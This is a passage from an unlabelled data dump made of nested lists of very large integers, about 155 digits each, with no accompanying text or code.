24919781996085508514332732079307709761625967387737935779630525573191311617576859117307083887806014283565056218906140385786412953607196545245275767521818019464, 21267674693655929447647517859473623080569810335948114996874903547188141187239181191812806429540905871031592567683370462856165530225139298405339063002944008933, 20859253641826651996964570434004327307463019991888951033135824735046255052991011164287645321449426424527890111786754335433837591482865337290382779269472253223, 23198807581341505599178169465303912684785842035642902648878224646037645407715274835585428903843744550475269402098604619116500077529215319982173638972012788850, 30416637364211080205174419758117326937108994292918775538866141120033239597183655885508450704380355767605109598905858201484978467366614312824190333639145051041, 22853185503777763494886005653535453351467392461757578349974394688266838146213860516393369169410765857768746517951379578578205070660125639379599769951453932922, 23090742878621434754556911360864183051929714707379720537443377619652062883547917027516171351068454913009058831269834305669555919440028716886468964132606455374, 24944035890420748156386034379752220107707079439124710000747263067148051053594705559068882858409257270914403633586205761813450305172603811331171107809104613071, 23786591219482489869465233836334330596407430689121416568546822722914222026923966778372545656352514710495120213734383684841290598133340549225046525542750716101, 18576648638503911130672572370689583515086438021756173537744175777277806446790448287851872195862100567904792764031467474509159764851759801356733560526771273482, 19030802230103586182292486839289669570586641805424577665672662248151301922980645638641539182108385550048934334110757215295537333338191341496162240524692557467, 25270816135117455025129420670795066367509118404043430038323271384554508333786210171348048431861521751153139815036431893620200762416418274858022885517547369096, 24417807382849056025271711593974976571120205745248159493872366377042549778470315166420735207124482273461783570109735589545023285185975333265956960118839503767, 21922636582464797218873065443407948788611382948810981227923718438731386918634381375505930339851299798660829901193565650380014001075972860358123987692659275428, 24831548945940024119168638457640598896621188192734885089016673264105709347551645672017796969807617650038502811107510131138458140983041555017511908108887701590, 22882980800510557152526141951662419984565950261781391705324480501793373913890959497119316678178796342156981240518800615301329507748322412365500278666446137931, 20454441680802177062905462601570526583298780304827553182319951731923605463023761472195313188047027927482757446436629237288303307798202568127829832054728906562, 28185948774527822663882255859480686091957528364735227561145818796234831901290230217429889300920276079627792276043067595980612197473696667074649318465355055293, 22808094218627818065816623923285539955302571291718436800283091017235757335517082035131275964759205996303713245960532755201943428057361665563442529809096798483, 24247401664143996636351887671143969226390590184910747088897859831848527363596701567144887558364518217667393445322271358599447810200312921764921387614442732880], [25789488680897909054046845718405638829979192681444045073752455209015466037469058694292604364188847944895248294067623892467314233940641346537715293824539821163, 24245889085931577577818154573639537013564130615999729196576129377702920625053356041528994974728205948064462814835678893428305834116587070154316562466385077804, 20898598999800949706999569784478217705117446556359068806337020295728299789577149271303461949301956120844231807137752226787539190409547302781980471453576258666, 25333834617560032420856685669927982281810527313686166272586942188731848398623627098853131747634882369996248541238955465981506510108763679881777215738490542102, 26993869117591963492502935378855131200696615338409085354767449472684576429633280350728430664698587234146341754864445397286272277621170795589365515167318189707, 20076539466399430914261728680644751954683775879382513163242191299524306026358787792143270237862558038772180080474993932416026333081951515968860778249983445060, 22862788902379013670115649263995284687976770647390416191311707976524739604980089914897620526589961355258345877440201790674636438201859379267678357586741465782, 27472616152913678806798277742903954806360198131533058447885340895610692236064231780319841992439661421468507457914157557044386441669043436583462021417958851880, 22431773798815600716494553427497449702703336046260849567889065453030800128922635568206485308300635403283225568039042111493692098447878305931493221500597108947, 26960153102730108599872149543106484315900441231891282720659436810318190483574095984956486206228678102778921134429697463289772749320519930329692603972149846579, 28738584736063899374774276859144396993065049295415791062256089063006983203749998457869574682769663681767460900013151913319695896020493642824423243396295075275, 23728340122970188754831433259598179383045602689186364609195657380729883741106421820589511903777770761152645707882961262697936729008786076659458047470177457469, 26822368714205556261295869880408319236666328431912528344364490257548691861288504344910947247101560905639664709796526727475001228950045229316028284380453213887, 27179926326756033569499693810163845562280859780111469887777653163797457224707773286933624227880009065849876132263533431413750603413690664484672928708231284946, 24950972109196960609313374962483784924170579012816857979773376294528147271993772396479929197538976643806363062040678670212108875495204992273751370235676888696, 25580002485574615591946410829590356615447860080878873259031463240144495000840294706844260043562763905220604081929627590279527199898502298180860676359189009997, 29164272797635545584967024255128550114468176829684187015739292961682853383724267636246722551014120414594612882200866626232009088577952339556800427275905390953, 26028340943028425235938911176112539345678705492539052317686334018327744421734796968268120462365177104766009569686815100538512847126673800611261102694736700896, 22164180962383729810165136127156770184166754417071523816828476554726219206277553998035699751307903411801456202428350622464931787223060708338097547763333855255, 24110061225365789488640649916794948224624954695268421910061562748623345708053823905900224983731936788390072092480479488885245679786660582273227586605945379407, 27353757463098985912190712064559477071361469794613290115687846243642835957536408805534359542134787237290519392319640669562180800732864079590331270211070638380, 22255671529542374827665891837735099766730949924768740998982514275082325568253819622376641127339395470357303384623145432008678439972837603745407212883976561976, 24464929848451047487535851031505989912314211241327069381560301102689418786860399732700281244002499730932261945078833496496434363861004057005411590019590901711, 30616523495173807297185348705223961778235789710918297979439604967187269210049368470704354637756410133815464515159766152635290796972158769504621978378302341289, 23462406202124124478281495986430517600135149353385018196788314600456698589995688598350633250997699494370191315735945570859708646268273928768105861851760063559, 27305118270605381926193448992953669593439140901420540971779798614748426525946219596858590852355470667459123411115422369562019980779432396721210408622996163705, 25115463340216474450465197801908221507223712433566711486990416861529327427885965288435266235044090644452716032868638905466833340187713188765922285695871552429, 23571721515663241540502127351352669698872214540172715408615407838910975739541316729398642635014594277034640359590218519184387789028514145688889181334354288170, 23063368455618752490631197075872317619907718989658099444873043306995605115982262166129036497869298582975142637855526669596690829375272772444563282478278864431, 32581817924537467162623978814861310626714400643815798066779415540980947482807456368360502963756641678225264400201201971999297406765526985048559632156761956683, 23664929091712859410556934528025597381156762745933197447361170643334580178879183922199312514255640433920251824335051712512436127512229890810036480765897175283, 24233427416984077402886813466712444617869892092842021824061052687660443827801901622126094883649014427072532734755803764066994996210904387917110063810544317193], [28109011390001926281788990577236006809121732391030978559996866238166918811116851391193004564873506622367445054894774962625339000982969942894684112371248044563, 25644162501269372238218658401487908784346046065449223483303579920919328402638097319183252808551060467083937250080241407477530471195584794223380516422213359742, 23807059450124376538341300836283140702698384423912928310546764495125101543448443342580451552371016904440474051631225477622326744708709528252139690079617125798, 23788846472602197629881094399524103124766549239399811734235304808351304908467923257528229692916698453199183155308041309364376055000273421485001001340615333049, 24774694989926136821926991816999949808687290825142029992843321652147055213117502783423377153693178065366962669567228550564599647168690913673131365192928570992, 20657421900359841001026786348009754164413150381697521468908558752835781100472798864728357100690087966389606089340935452081425925419614376920785165232031518285, 26891089115289240050270376250357850875004559908244309433938156776887717286545778196907600411242424645209902473230752395557986384378168231159662445859739334744, 29099797173983534303239243693677134278142384931184523204221383783555145337184546446021620594118858171355461709270132365994135725710723444965367074647202391786, 22422778176491751955769871836772411420615720644128921360987977235652454873194274341593638338939012940987053278568769016234178385592681242840871465279031392627, 34929408883430313783496982376427415043222616051980827226754891304727457759274784398378761301082783012463734926469310752229899241127191412975160545975376269454, 26306469136512830948675561239771986256160541071117620583306120750148237273574274113685437023110601867948827559505207653192505363642647801699944708458369670789, 24237372655840350161770634856328161851915616530298967695462548592635331994502867433070125366746527770401980280775050364540340890371629962998366338389009477906, 29340970390975263695307776036817247056726182569455278296547001166225426113826574820732911330890149552560553359221201463785409050193211837994966410280517950753, 23696144766857869743125847431839817620525278007224800540727708153569691053271832137873792651467079109064823437889079615009513493784907990185198165684604010010, 26373542162486412546457160665585119832799146974315837617745148971200836967874121794185612409970331808662067008103953895936172454874400604707658943842899286608, 24366056512718681716086839335670105271276425929572568012039676318397312772124103973599128357140075875216156839530655856034370344275780690046748511645149474309, 28757582689070009433395305832803276443405774688953729744850993453172495482967517735347231728242263357693447044575343368491882808169356209172130907058067803286, 28768370235240977644687215593990979956597494960190583604437322251816046563627396388459539169260539237197638429407047185699288934808593207015831663590606272022, 23992466263505865445224692116418545365744113460781903254972407770053116429422695764181129063062446814077781304208141061979341101768097680737374716330284681221, 23069323657929231317147446449831086633198273586058088477031293668452724955413297402590352948379608141190578434443402908448976446864199721891368385170498085685, 20097423298999944633158182196512166587896688192611536286581523668232363856768511663897299312743434374975064661333575798147452901503569825127293352011385049847, 22721194425781257505179460715319059977363038292629226369739221794841289817249703723777878241393798274767424059223482918782709039775968322349880188918889806708, 23111741581902549226397897596447600671299930347923371627980282084100318554491664763720574242182824019898360988192797830974798803903062815053539916523481440604, 26973913595145277327182959566200887988335328685754468751622013779585492670553238583325227974805803738164449935266087173827592945150474762721764892377090596487, 25551498587272231829629099949380657523475859262819697639028705606913112785425795062109371287546855806336320086106050669746247778149477515614820268635903783569, 21881415382648943497248985787928718730522180893404259322622979840823580240389855601291286221670035745241166372415247521401769183672973327551251257822123901750, 26703879333099462773545589928278355273485887809026166852071054566712149568264889696907438940443341094887650115777810593741226568792147898524012358961740380743, 27673216106823445227196258053097585536381482887108167803074057806446450121121084679282286298063677326086759644441929045953831454738067235969460483632703752744, 25210644061435500579518448660270248770865418667728742781247062967296170921964712922022363179358331803282749572706908793859901844421237315611431263298917017816, 29867946650085749933540633547533958878409751765705319372372991236510281970937987301259359858481791552071634901423211548739219660159469549354454396083583194974, 23067287238972838268248626020954161993487163794297225244708342311791504951232487438885106357143047712651659561514578582032823253934965890174547965347409551281, 28909021730445246715240021682724326226838406754881840613792398848662804954634759691584543079090157723689371860631959802440172166081110066632612250476221732637], [27784370509359373306168516537835842447531972456419881707847891800837858887465199381232624648170078329593645642021962082120891355929620735250757981937980229737, 29054295423645811687545955326711192546193644768613545926524686813948593709975482660465661038011988821614466297625028346891258735261309468805547740997362067670, 23484871324280072298467544603341604600248945456565117833377267675220662893616766069580812441898654725972882043093890972880517843408156866603498491474963320126, 27520003745479634894230525620913062223612524380632389299985754178055436946120074083277428347222998878369590407771259786717090888952243503535270324197402588465, 31941326072478499406939876849167827230152511343279028678043666765072717055738516199275213816588951347799689339972885396529228705571871514895851739212143548936, 26690159443799629761684645280427743069975126359744396830174624363489882939232534438405321797851904393373420996189064598747190901003400521035632612640527394097, 29272017644626122552127976796246253020006635570802111977669845255542466052599842419556510781014185572836106711232721048212451161769549319066062921615442199420, 31777711228183583962485238116931531858978205734768784931938783612177263091627518824872904252008252888714609054838904574313474494025481065045810163401292737681, 25741519664496835627618128269067437669256781602196168306961747932393533667367579459030055963218431907445215781707511104293126574789511475446544232437531751186, 34074131839111582970018217121970626038142251176035660185871193061595989575362526979577928868904285416958035927015256265825798685732860108551513611287394900959, 28495370647858720136884443147324069195723756598666014059118122981081654441621936314566253727482573158671507461132299979532201260350184117483539471779236506193, 25608405122842723817088629395485001564396051072131661325104326810131044296703556455402467192209215925634426430892626431315112372080377820402345373994579022195, 27977188846871604477006319648646837256163381955480405980073054314898305137283899480632963190172250420532205197974471303411397597756074199877726185292052997245, 24626720817253966105329467980236695035976264780827806208956032785795266370730174511188229800623936991749500128810979221152777439521732647895560689959153300314, 28499530508437578355013337346079930309774132991942466010620552802259814678545718776739295583450485993707407284321130062054628782914987302099917955933182751605, 29236894860510835627069658949185167364084732481527275485491670650988862917597061182373049130694540409468169113048782749230951179883350198132025125349252592948, 35636408806779364704312892124978796358764237521520423607307064368014230854077334023488634222966254730762815005316938471632921321078286140683706120555542505435, 31804893791731143339809683063673184482465636219587995888665525202956205323275489349492264059124592139556676971621103757366103327945723619268365106583105062247, 28805472527000939735095739807393849335141432953448885266196024380775566379502616098642399896623090941603546848778149455392479973856201292330497789009512560858, 25894235364613115993229039567435280451067984465204559804528069592381624250183840515029639277096630075370085045959243508905645133834832347401099537798819636076, 25515049460958104188039219957017322139188202837463582407988155813517147981434918225042721964992950967297862211979036581123911778482870384397782551007862867202, 21881552799651499940587010771871054672425343606087999446066180807355259917604347260411033067995520039802380219731076708517491635160229901498532267329954413797, 25635877287496220351370133237301465511997015900150356108615145311919075632702178187537005922760499121349082482432387740835983615099738782116009882185410046276, 25491302552902592938545970800952058489266883425501373024432957667825426763811235365399540867940745085759040352870989857958104696397375664540977512283271711076, 30093906282025755483158937271643388938600526502803337282385948889390980981472887102826913798179679766475373844657154726030422331503022237352859320770472317365, 25725701130762029504531463517409396947362472664889579321583010342255660753346564197087468777544893886191057819781529670649532984518992006215414442756325392793, 30102975056442333847836982105660983356514945768921304719838747420820780274426984768835452753492284344508496065827319988187618226955445828549176575292338687844, 27264103223218308008170468243901060532397558043890483785446093087243414866306529403641093020077064306527072572687060767585324406671938066707166735427310932510, 23904841841602116700017031448804546925627068012924219966119787834984311143870222478817063141573341561890242754417234916456085830731201155826636506340706224006, 33155432865096595019440555214161569152481947690997309650402261314916828956117408635672388355468164613982393099792890276302431531317525839807559211496003545314, 25444931999725885725449681183317765681582708046565017154974327145071743743441115762024785062802682679871150337988505648078908461225880540183200545108525503190, 29888490493808105427025062368346354736232223113409254247814568514024909125970290713508860508368214563462086336215411290014139054560713874666779472817298595740], [26726831727957024364687355324441894245865546010223012182773690266995518070454354579579632122864029324603216155108761986643696757531344255466863502306769957531, 23914405091753696199129770505743659171518856041669307451022749708508648652667862978007057679715107933708766171949497826947434422880492019672418398428247358428, 21810588194512518440671538554081565131474867900674593999077026997281465269189738561254659341403336131325062860492143219395363759471399999160443999462177359712, 20414263434700712201799915138153421742964837885061399992698852886297089355969598628783629428920767045922051205577619303259530195312222694929485871602072945629, 28257100246485799808376327558343529131123317697564302056606927904039366528103125857103174131043522485762211572247669166776739731082819492523349163766863135939, 21953718102263630341702215050239356415465916661921480195293659625953417930598031711000289936970401992091459431326492526055922232186186405380605578398523392330, 22401305658959541295402751792472896824738454075986708836498947516820726303973808792650455851090471180328573652140521361645250495814871111169864189512670679007, 25898037283057124759516080375156438648007575613385753392181187669075747307672179096150945762798915008946936449501166077118296451421593991486583966475797855570, 20522497094181961821296265074608006149372015553101354691602049431903000500530109771413286821529681565192697487989510729785443445236123246942475830077786910000, 29920947123281938911255241789994006115419495364736301545291490475214259017180309311145168477056240946742158878894870648185923770702561304044927545077880876194, 28182143690574298622112644364550026853612317709145552634973299224612753715419994829989605754456650919504948869146930115080266164554433495003607378642902040206, 22746492498840512709884302265607466155554584172943668197012012654223775871325788044356071926618703929144972970882353411755858252508785932741677974097361230853, 27283591638987129420478667476711087533324289025370350736420236423275308038872184358827402571290508765685366682145079964710633815115739113940902739873535455232, 23646311706943427707629553067347172059629110868429285779342560025474332209892336100412130901516934569675716233682028364187076872202184988912079135604207296298, 23775089657082323825696016942553276849864395072382471937145321603727180872344843090022634174411963628393496019152748110246742245195724633573110919709076674851, 23984532930961954175179872685225675155733907627663055198112628820489945506469610586911699216939956213083779389064693320932639494302615923564597022596427301035, 28450100016694618713494329445789161937799425041546821334709023733308781576316287798515734339805598341821916004418201471888735859262455365257277045805065421102, 28474672802694158482428991327457704645536794168680127867490704170367800568183806580064281525309800731493470312481481420068909601799123411853633923695136771907, 25055173044173025725735030720348330185259889181472565405202822181332603959034521223799010995332285556045622466006598669698821100139490098360245061236889542810, 22097901174505657378752606463617920841351372138440237928058659615982150677634185345327853847633079254719264327968255236384920114901579414993067935937689779482, 25189143203293523011659025714319130525706080896880743418693621689688422741223405541875143374255840600115643164576572473278719928346368685982514473429442936900, 26397475989905810221646841326091411342649830265421611547685169514955118270214834759015155881860884248771800228103694752657616224422121676008094909161330551806, 22966070509389128531195174922102960145187223051004580612035283666340134250587394331865156852870356317693560128426875096099880020967674737478021969918727016716, 30668533292751846497776319581270663272860316915963221639841701416302988586127131215376099929006690038983802418423905870080996827724161953349749820975077829840, 27030184347084030162464977572140475586453273874340658065476388719842133979774283537037013652129751169795057475171702007125812299083739726239632535107028967634, 23423245698260951083158822530910463169185585872633918867691132421377023025144906340519131084758491260446194655795861595851877803813191515715949362263827262588, 29556285488570161811435346746802271612943368483164941505453270892463920851343115740090481051150491490101014412086524334297542775923469682410855877312557552493, 26548804076452487308726663664274461131811057980639966100603219559997314924378769962092657473916531139706967935899808883974841349122556239067068757917097883687, 24735360493278383050273724257703990723479742980891408441736022877125503899687019625095357775392672512423474498945046346234958205222576256610434366715144738314, 30461242368996316943286313620136708154529748023677152159883760458664741190106933579987446367618965244488700637758517662318868778094011196685982372071725752823, 20848389304715845861277478182731804681394624173884956331120518825465386763132112446880177930547242189936174695530320064325880596022760317369708643941366586450, 25799163444972635175705184288762679516456190166939915525479879223961452993274554254070360912134029884894745009597551398366298934067890496721663672908439655104], [24672570431820471671126002517039323557024731046425619797546006732583701358461441160025557116942581746182211000601864412426434706886534372547860394305974772267, 24772579541391002485399504586204139279028939685115716253930085066335621217320731627779777411834626538460675560021177917603866532861235171922953140428497134967, 22028315341083446990401907416572018085579397290818804213888924406706904667848508464066640730401130452422003322446411600695656074049041977559083374585432660731, 22052917381192983639084269268212344257027277368123084044046540639492715828317556431028436947726095703947839463763247414452774683933645369861120864286995406427, 27042683641191032772699927365814275898195815535786392176326453023877268229959846778715366349701855076909152263278308227419414964279884670332683738858738007568, 22350715863217845697887738038511088413956743804424192741311125922718905933497822561732037951717243422873315160175329460732356084057546756365416660739982251167, 23266796888722907957937686052193507502136865904324350026501132773540250924380005342835351109689613400714225986989304919853481151708746919884639639644520298147, 27076830354170752779261319376868638264674434130937822395330781208922244772539682562232272182026500344943639036724311394820590837007865145605226059962595928092, 20239131486093713097783360512037317864781724017917150014360413445978061135233848090663130882582660465341347441507274539281259891621216679149138048537800274382, 27947252422096924202453321217669911246616484439236685989730654943418926347169801414389685385109754709875145968698774778439651531975911003633412315566380372288, 24853461034765256898129853892017672562863274384361271020184918393975353751740628261026323013638448338680423820228400625311379741034087751272651135019842842399, 22416482499196756578407204174559240474947668629042916779556969286310317942308106074761615787929647147879380990982946116676066073225709499373621042968850031328, 25639466583128259081512749105918454230894578667706441861000571173943704485529513075093206840145560394732625170831826284425228910190967444212636257387237557342, 21096988342913510676072915396141097021861684441615752094186518676565803779009516571012260987940791816370968951021034209787680289524833112780833579337357167764, 25602758534183589280857173988113342727546322359211460362017735708224504789552453972841362701921015337706248034519216676090922058643175454331676867125662980846, 23701974291624671762486946735721191143997406602852120877132434781641598425077917705531508478969045007124899110583673308345792145426556348114812449741927043478, 27947751206508926003819382009875100316630478170973913909433327044820306863964851763725152059396273094529228493743407392973253813675276177054405693276118575571, 30360540413231866559508186217889180503600711430738962939477781724906820087328209322323753033429513500123093442314671120613875384568826109213540713507727949585, 22592069159460370837449726312576665315895178784129222304031668828887140755186835003632230444116617675689973679329695668393445993250123991506764585228387179511, 23748642974603578223933601902778057917662650345454912233673381850014329347960158264883402745210441758784814936658220780101726923335562862945586334233747129269, 23215912105713022933604512611224327427682472913060292928469698217900996027418716055709397476501239458217487650853793154197962495199033720130206785610454902371, 23257810509465010808802605796711617353172768136127132981799013473771900236193582111622067509064206059860680315547447296076424384407369445406061748475697164558, 24216649388740385505653444414471481084354298089206088831254214928343850335915879345809076123477680393537974193344189827006791457620950217880518743167031863805, 25812363952985602320983076257964688289002605133735319004120639295574942794032760694718103154800700189718406954890400341521620442750200450828450806905836014444, 22689814942212365913676851473561509202539124380900404965174628291825428970676352619608074880339367701542782988657389694571815010705290277300073796849639013427, 22744060358048605099739230717306762236375599224983273344742853332243470042837735585305657845983917031885596178003622125288922965971647061034272491761817118744, 26752043220268451994895778461089588289909714380785736184851524844568062765090959162704895451263193929228084940659422283916588755719708929854289332788709956948, 25371146567794011050319973922265880688147126581740725851298792817869060113668946951872011517212324552497951963722983273794166582808643016433733109787105538805, 22582229253299543313046719732046914946115334090241005436696274843147845950364475813036798806792322937908742017620836474079579229428420183261764208385278647503, 29897306586998329860949987828597446422348269681683249865696627429133903114296289315118705787576553225696770200648976925655731229372743262621380420406990809528, 22766787065486573981425841921835228286962961664496227138430093125758223650929921428936220241362472896478005303733573603986054048849508526732587176704574226865, 23308736224584029449352232926229136399771601300951778206967140284392779490895162427806499032070468839669980366232029920254376484675736949348917453453835320652], [32313618922365481974350683710976404629112676717747971767116126948152271194692538286671649227640515660862230237810358301937047545880783550326731096629961130471, 27582447008939845329907498317599910080946773872171582482054016128870679109831857086255464906610366243272755776533497117688654567830009691307306233490819427328, 27754945570480847675983135737772249113683523533054090073139644470852072164426358999782711539803485400291735770337481524265029498389361680170566693608469770787, 28485404340822886983679201796931414949927266954495959934228917127146166374742191054859483289823356464117241574438703399170757697239908562787310783026876669930, 31799120707057179821792313275656251083643353136455763581704075714414873472092614516521513604046344711056882004110681784402656645550754104725359183260278178207, 25438608383268166868258223514844501468247699547337951794027755805710984948629650066375657640190892895704048705701058801058438978548253208476503124665486091229, 30592022737523402574428365976110123509323777774356031146251762321182485989487413877089795082253349317667628997671829694507719616518565499066788116373440132581, 33735477819680901051737394516568979983176654455948869218313114569936633832975131548414988862774434461531968286596243299474002205586120180593044780106938009495, 27590005551886099904117762406410699933286423855366760552233376513430681320128180255534404913371375073310430517976033815136361050889914033895170292850082172435, 35586154679306694357212816570219880442705386452786291229748648746772765071794243883332624327797796867132279830266503912852287030759641363888111922727328593276, 32815637916618399093285073586291690824863624953272282459768320664018621590092230676061992874706287488274945347062451179066727950324862346794342856030894785137, 28763264250613359647771079461304142953261925804097970082556642361071093396125921858941822030579889238026722028602686254954734922781869451160417311875943094369, 35654433755602589708884824557172347870646619110966059582893904197317774042925402573069927043459522089480237705264144760581698088468581208594511562887213493288, 31298032903751316649760072297112632862369794241760025556652330654270917754538524409120290843660081314240610168927454729033637956840433722438662597089959846795, 31041123969565801197276843669415878800474401504046828833631747116644775818380185358637173293053617795560529036926457617143154922321976764509754887504475717483, 30516284212219051827122573790196605434389338209380158443426248574298357714105340005193266879695708075042834780090815949178109049499908648331102493362939391054, 34915580469203774171085001246944525640282400294592806191836593170872599673572279740077060766120487444152113883917719485855506516286750077910220141363200205508, 32133978546343392646246417654625757318700536297513364440474061119830374467435051297351954565689796873905721546640111401220308793682801311447711912665896072196, 28830768223296206018757446005269585061447606144238274962096593806302513600282005823640472735391389689278317791896376001488368664981249615393372964079940572390, 28580039841736214085434618246477096764000518895525401743344218233400250576456613301332571492354731407462153189413562339117358297415073545379080162448532983392, 29279614225082173136873507584251844942641856561847259385558959925381677660078910098458468606948161181385135513250059512285795249952240081430692506596296353239, 28447532329652326986428080040343435549960455356956888189648389638940313141605305666798441197273501171255886357627598111403573575889906575594656560862542237736, 31655065136760162354768596214789306774254740098346965568477099186859173633460415292848301118099788253685853803183088851082302418231487029172744239783117352835, 35740925259472015901568633889869824878530270112323035280212811130775611308203147123742742992661365882298036607014361988749076477254722423930450258705431829336, 28416138355055010971974740673873594717254943797829385301133534175654924491791449090553827401580811650278111304262075409475550847661255656178749266923196193179, 30696735148667209775899011948548528606184663780344955351273955429707052582024504122016657774932696801917882227212211041050803144640512522646196850654182780179, 30937394060716456885619044607670545243270738844690273318748532366407726490842737145585172842828540658781933369223046840568433844228879657533912145922378478889, 30648634948267739516905864196917171336237705305252087948540173933058280455462794990304518195786379541630904234074828289753567835365948821936483931007251302436, 30105326033012556669877041575727115293620591513283746905370568649876546246522029072301592210117692238931733427239199967261710542264400162399818252078952609978, 39239621121363118964512803241301627846541866266038984746013087614143156676698308006442427951538959483757430330788853224836893444316306064440867029117526322435, 26914178277956526236283424574097058260762141915040338424049576281574989215996663030679579434817343102132047255663570656131247115912575481132890346310393318308, 30417449019426389629578219127677551451568971208825032445734298039566965659024381750516633820798386144960075701760437812589331031989610915039908248476099549092], [24351274224162862909525280999446990143916200117318326124808995651926707021452982984935648392382044964564391295868774082505348008428228931684352237438335868352, 23620073419001961594600046573626995284464446090817050915535212004808286409759015378826097346226152345366571585705902513781001666907565477184369212849665407361, 24860618718269756992240827869449444166459249271640249619760061364908255723504193922356256891833419193586536841781667376756661056880604346453369659772906531989, 20678749344653164856386200027113789170272237351670905978365198408645636588144986995561775793716774440160269460057133486177350284978910604905901298758229029304, 25389259289713626820670489501133565693026955982142544779399895119733984587957651710337132381326125598102990218603401169078167406588987601354306027907336303826, 23121147559208493240592835773574398535334023308727874448770377110180786121756032820198243540708910093117173142356393059411939414687214653975714422089114556565, 22601259095724823546321141848842004590841778643591199223152086093188517321697586840512132191212231386512956418729290831065478376765546247451353580034559057998, 26044866195035427166044770353642952204816825042199548810046943694841828709942865194478873752778809789241800412258915174460618816414011955368642789392907254609, 23007258328943460406979182864932236861278111081999949226991932384130930770689946433196561487833587472007845156030258345469986286146702462542440343515277249222, 30346264668701460189837809305998431549621616247986265932277567785537148608630292494266980345355706361893971701276316932263805058481800577156151776132919776078, 26855585469933837602051333973993265380443083899831289294421160583157808079381446858088532999701344406075830459238003517865157444371340917922970348862727614108, 24057552242542976244018289826419029400781474268052961165066554898367726590659163492099923940678679015215156003614952965260209705338649259313324686507648431973, 27710500322568289163469667439427535377983567367847837509195998509530190853619665146489936817975546735828790468585378125819320874474800999844426786705766037710, 22682632719870082564717369136291656905097840561241688034436962354431785340471194861857062986804661308424775411163016278933004967125632506978378745914324252046, 24704499119191515598502621160804667808112892051845535080420194657028344291700998700653410255264799099153578271267122037987325654733465418821494483765410927626, 24243345416604269462088312362018603234792825565977961282815132916972846656899147489519730395199495105143350451442269197478609526691200021292936060444210289418, 27130075527037908974648370240118337181659925858528771834031204790109599413828264439688693832601134626045399053436098342838259450985790569831671892463131704146, 29146658116605364046918008390867845164673237732788325698270018687821181380920746118446704737193442943120538244616612494349991862075407264186775937949498458784, 25651061664721178271185199175917856661606207523765057286153763608399699294670224947184137388629181379405378454632835217566856962804001711615599797871068061450, 23641814205076353597894592324156555078700525506758867426967963713901437597489599501128986412171282537675791845811876461752313980642236656678113589588775969878, 21971079007563554791264007739325101310094476994447178766385693951712234053608914762058284827054620105705199835311148198979397284773329808398692954625359257926, 25359955158515140780357088654565955445658163421167329296857401719978532718236428138821823383728812194132394043910153785229467254427604612887116643202888132450, 22230834836070406739701338575877313924805129103463297272506845708140886059089643722211486349390193360397898998243230126439292455490598127313246556960960731926, 25694348030813985243589743351318043355719422129314248113116986275123146914292473413612923213394284253142779224820534962741658790322580591769816660627776272234, 23130793960086245432566973336850150194575903462232004656850301143334374618677440857061725566435980979884161562456238182526238461920497999534523670527043653565, 19454408345010003152861838685424413292305385495922702858350767352264992091485002879019310903933481474553833365216802055679106156755680997244611478878335163959, 27692842667034803012506674790392664211987001180778752692798937587806258713836477037219795378266661932182553597592002610050846505313851084304716219055278326041, 27395641976141755799669795356897539058084046543759558879240875583248608024885578624841182045964323999681123185822060843116808392033750050832482328839692507943, 24056837120760676753050201273789577538838620191742956755464900524039155421891621354411329441871085909286304525549768185702027944887970993517224271656844109085, 29239840693054188687975680016338163105243065772655041140976294601965811188414664191705237710722856330752108731192348745921900715096223863345956583984266199251, 24503660031580022655440205575644436103283871853423365798396551863882163150728576225948395447099965721664327500874924424368401663820043575421524753023357039612, 23493858214345819610182262388646338981348776172250282158198562117196479659921923639685176804313573516778367549510307887984704816506965264121571244314928907704], [26421343275183990448850619592977586544551757447148280929062094685837539607761192549667363100239731712796426100310920665132828791130406942636298751821350780516, 23522651317316403835800986382576058864153143599283138407008763403301575696130118397652583350426506832495610465182177270505520473134776732464629580918359369607, 23064646016822538990716357608748103101880901255581666507105509704867381468308103493920370687939765824405260431898795829117817800207219266265694674656929695323, 22248767634519407754285183519174592329752586207951539164584940523859855844488230723089858133853944129370633700247654040265949891033294191611604917558275539690, 24856110690088254933686102455162201698196890552219811459724584021824435549567480888686006961955872069379231217973629370521394016923991609375039374730994168758, 18464644696164900766596136707538506311346468373209881625810270808150084081533661301694478083844847275832773532555713317581912877879324568960454778823234454145, 23719590965008174838992625784852804894154368391406465964775349041034213803012577211081426965015752535539962647178114650659720955571636933587435452412475197397, 23027418667002472095489613243930749892297061570214559507751779669175156052442583249196833486505057117832264600467557987813556195827523587318668520696928162080, 23648261631733756050089982040192374306748004934702448378395173725787453502037410641446308819642182437694455340121584554780702761223099725774059970217390813524, 32685029674977723531926998622589628006319047832138761861885226189417193193587343222303873636615920488123372044619818577105993208553060333212228112672529210628, 29189997050503468491353784298553590797351897375614367733771878139902530302178374370987550297092440193093024791828552838911463678251255851015340085804738934334, 26572895452351754769933366237153158511637364584457616858054486270194939562895590068138523331099489523010954337759034449101605691184948988416244481034838810163, 28221050126336599564976584629858572965924439092143740595634317069440025115263224316062680668033302411470312167400864191470335094120026634842270446957238946997, 25236942557674702118960081334139142244688190609077169571466415217725203164241230049234042562740970533357612523137556480247278924612328311829953502808310380097, 24041620745337290259770091797872929893575679442702626140052777368859860045771796159502891112875514036210958390496041888982096732428407311253120356866838314217, 25940744539612660826617820312415859496043612724959696229710915799537059143965286837273507289643832886133756834973248160837781320858933515942063521917424132251, 26002253563679467539405182158808241973283426464295763659590086056046591270750427183017877545041400525979901318283028836403453173991112864900763379044501762937, 25771529425915992743164493462150801556272180435424487305148295840380158806019665157153434139554320841308132715677926888763460276336100611212912649640419451895, 25185791104918160764915768421161092044203036973522235370644405732439778983160293247006749692437814269617313288034978839891709405415100596589689207949605179877, 25093916114589055734100286945630140081353779273729472442729039282113596537155964313650157178507144014015816248656098910979868279977498202305042806777771916072, 20924069933261484483836794723412196298554208616040279911917960093591232639205009910182437840525362406117609632568611148694813929990840095466384791509954275133, 18593318051646594767371605687948394981494297190370868002315297370803723592674806742698681652330699861758277266936565306642030089082571949310716746775124526140, 20766491029789308791636922163067435792993986767560691549286863842605740721535360603660032131149861435519678481925562390227116746908047270258386768886851044529, 27377849854297792903817782820426233047285086752438296865270190074167665403813830303807362228498577517082229953761000873410591771522876989811590326498173244092, 23865603667271248234435481752792548498579884917505653993316025383084505601460658973776443458322780820061240319738087412027085817069612534203227010261998967904, 20546167332838612018711573604646161706531584281038122804849656295601551015385129833116531434069049582665990727615615975286268843974518784701831463546107034080, 23229965462134645643446996695908979587655309651054281025375836963034431180793608540282695562081933107856524607882616897863311691991905564847746693917010835100, 25319134023400134591688332755606557259318206130214835970448944626341199109621742496998985706379208878025495378474532407853464572045650366246184696659989869146, 